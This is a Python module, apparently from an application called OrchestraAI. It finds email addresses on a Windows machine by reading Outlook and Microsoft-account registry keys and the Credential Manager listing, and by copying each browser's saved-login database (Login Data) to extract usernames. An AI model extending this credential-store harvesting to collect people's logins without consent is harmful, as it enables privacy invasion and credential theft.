"""
OrchestraAI — Dynamic Email Discovery System
============================================
Scans the local Windows machine dynamically (Registry, Credentials, Browser profiles/logins)
to detect which of the user's allowed email accounts are active on the current system.
"""

import os
import re
import json
import sqlite3
import shutil
import tempfile
import winreg
import subprocess
import logging

logger = logging.getLogger("orchestra.email.discovery")

EMAIL_PATTERN = re.compile(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}')

def scan_registry_key(key, path) -> set:
    """Recursively scan registry keys for email-like values."""
    emails = set()
    try:
        i = 0
        while True:
            try:
                name, value, vtype = winreg.EnumValue(key, i)
                if vtype == winreg.REG_SZ and isinstance(value, str):
                    for match in EMAIL_PATTERN.findall(value):
                        emails.add(match.lower())
                elif vtype == winreg.REG_BINARY and isinstance(value, bytes):
                    for enc in ('utf-16-le', 'utf-8'):
                        try:
                            decoded = value.decode(enc, errors='ignore')
                            for match in EMAIL_PATTERN.findall(decoded):
                                emails.add(match.lower())
                        except:
                            pass
                i += 1
            except OSError:
                break

        j = 0
        while True:
            try:
                subkey_name = winreg.EnumKey(key, j)
                subkey = winreg.OpenKey(key, subkey_name)
                emails.update(scan_registry_key(subkey, f"{path}\\{subkey_name}"))
                winreg.CloseKey(subkey)
                j += 1
            except OSError:
                break
    except Exception:
        pass
    return emails

def get_outlook_emails() -> set:
    """Scan Outlook registry profiles for email addresses."""
    emails = set()
    outlook_paths = [
        r"Software\Microsoft\Office\16.0\Outlook\Profiles",
        r"Software\Microsoft\Office\15.0\Outlook\Profiles",
        r"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles",
    ]
    for reg_path in outlook_paths:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path)
            emails.update(scan_registry_key(key, reg_path))
            winreg.CloseKey(key)
        except FileNotFoundError:
            pass
        except Exception as e:
            logger.debug(f"Outlook registry scan error: {e}")
    return emails

def get_credential_manager_emails() -> set:
    """Scan Windows Credential Manager for email addresses."""
    emails = set()
    try:
        result = subprocess.run(
            ["cmdkey", "/list"],
            capture_output=True, text=True, timeout=5
        )
        if result.stdout:
            for line in result.stdout.splitlines():
                for match in EMAIL_PATTERN.findall(line):
                    emails.add(match.lower())
    except Exception as e:
        logger.debug(f"Credential Manager scan error: {e}")
    return emails

def get_microsoft_account_emails() -> set:
    """Scan Windows Microsoft Accounts in registry."""
    emails = set()
    try:
        reg_path = r"Software\Microsoft\IdentityCRL\UserExtendedProperties"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path)
        i = 0
        while True:
            try:
                subkey_name = winreg.EnumKey(key, i)
                if "@" in subkey_name:
                    emails.add(subkey_name.lower())
                i += 1
            except OSError:
                break
        winreg.CloseKey(key)
    except FileNotFoundError:
        pass
    except Exception as e:
        logger.debug(f"Microsoft Account registry scan error: {e}")
    return emails

def get_browser_emails() -> set:
    """Scan Chrome, Edge, and Brave profiles & saved logins for email addresses."""
    emails = set()
    local_app = os.environ.get("LOCALAPPDATA", "")
    browsers = {
        "Chrome": os.path.join(local_app, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(local_app, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(local_app, "BraveSoftware", "Brave-Browser", "User Data"),
    }

    for name, user_data_dir in browsers.items():
        if not os.path.exists(user_data_dir):
            continue

        # 1. Parse Local State (logged-in browser sync accounts)
        local_state_path = os.path.join(user_data_dir, "Local State")
        if os.path.exists(local_state_path):
            try:
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    state = json.load(f)
                profiles = state.get("profile", {}).get("info_cache", {})
                for profile_data in profiles.values():
                    user_name = profile_data.get("user_name", "")
                    if user_name and "@" in user_name:
                        emails.add(user_name.lower())
            except Exception:
                pass

        # 2. Scan each profile folder (Preferences & Login Data SQLite)
        try:
            for item in os.listdir(user_data_dir):
                profile_dir = os.path.join(user_data_dir, item)
                if not os.path.isdir(profile_dir):
                    continue

                # Parse Preferences
                prefs_path = os.path.join(profile_dir, "Preferences")
                if os.path.exists(prefs_path):
                    try:
                        with open(prefs_path, 'r', encoding='utf-8') as f:
                            prefs = json.load(f)
                        account_info = prefs.get("account_info", [])
                        for acc in account_info:
                            email = acc.get("email", "")
                            if email:
                                emails.add(email.lower())
                        
                        last_username = prefs.get("google", {}).get("services", {}).get("last_username", "")
                        if last_username and "@" in last_username:
                            emails.add(last_username.lower())
                    except Exception:
                        pass

                # Parse Login Data SQLite database
                login_data_path = os.path.join(profile_dir, "Login Data")
                if os.path.exists(login_data_path):
                    temp_db = tempfile.mktemp()
                    try:
                        shutil.copy2(login_data_path, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        # Inspect logins table
                        cursor.execute("SELECT username_value FROM logins")
                        for row in cursor.fetchall():
                            username = row[0]
                            if username and "@" in username:
                                for match in EMAIL_PATTERN.findall(username):
                                    emails.add(match.lower())
                        conn.close()
                    except Exception:
                        pass
                    finally:
                        if os.path.exists(temp_db):
                            try:
                                os.remove(temp_db)
                            except:
                                pass
        except Exception as e:
            logger.debug(f"Error scanning profile folders for {name}: {e}")

    return emails

def discover_system_emails() -> set:
    """
    Perform a dynamic scan of the system to find all active/logged-in
    email addresses on the current machine.
    """
    logger.info("Starting dynamic system scan for email accounts...")
    discovered = set()
    
    # Run scans
    discovered.update(get_outlook_emails())
    discovered.update(get_credential_manager_emails())
    discovered.update(get_microsoft_account_emails())
    discovered.update(get_browser_emails())
    
    logger.info(f"Scan complete. Discovered {len(discovered)} unique emails on the system.")
    return discovered
